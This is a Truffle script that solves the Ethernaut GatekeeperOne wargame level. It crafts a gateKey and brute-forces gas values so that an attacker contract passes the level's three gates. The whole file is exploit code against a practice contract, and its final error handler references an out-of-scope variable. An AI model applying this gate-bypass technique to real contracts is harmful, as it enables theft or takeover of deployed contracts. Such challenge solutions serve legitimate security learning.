const GatekeeperOne = artifacts.require("GatekeeperOne");
const AttackGatekeeperOne = artifacts.require("AttackGatekeeperOne");

module.exports = async function (callback) {
  try {
    // Get the deployed instance of the AttackGatekeeperOne contract
    const attackInstance = await AttackGatekeeperOne.deployed();
    const gatekeeperAddress = "0x1221D5A033079cd0E0E9Bb5E40ec3D0563f3Ff6f";
    const gatekeeperInstance = await GatekeeperOne.at(gatekeeperAddress);

    // Create a Key to pass the gates comparing to the uint16 coming from tx.origin
    const gateKey = "0x000000010000a966"; // Adjusted gateKey based on gateThree logic
    console.log("Crafted gateKey:", gateKey);

    // Set up initial gas values based on previous tests
    const minGas = 24998;
    const maxGas = 25010;
    let correctGasAmount = 0;

    // Focused range around the known working gas value from testing
    for (let gasAmount = minGas; gasAmount <= maxGas; gasAmount++) {
      try {
        console.log(`Trying with gas: ${gasAmount}`);

        // Attempt the attack with the current gas amount
        const tx = await attackInstance.attack(gateKey, gasAmount, {
          gas: 300000, // Set the overall transaction gas limit
        });

        console.log(`Attack successful with gas: ${gasAmount}`, tx.tx);
        correctGasAmount = gasAmount;
        break; // Exit the loop on success
      } catch (error) {
        console.log(`Failed with gas: ${gasAmount}`);
      }
    }

    // Check if we found a successful gas value
    if (correctGasAmount === 0) {
      throw new Error("Could not find the correct gas amount to pass gateTwo");
    }

    // Verify if the attack succeeded by checking the entrant
    const entrant = await gatekeeperInstance.entrant();
    if (entrant === (await web3.eth.getAccounts())[0]) {
      console.log("Attack successful! You passed all the gates.");
    } else {
      console.log("Attack failed. Some gate is still closed.");
    }

    callback();
  } catch (error) {
    console.error("Error executing attack:", gasAmount);
  }
};
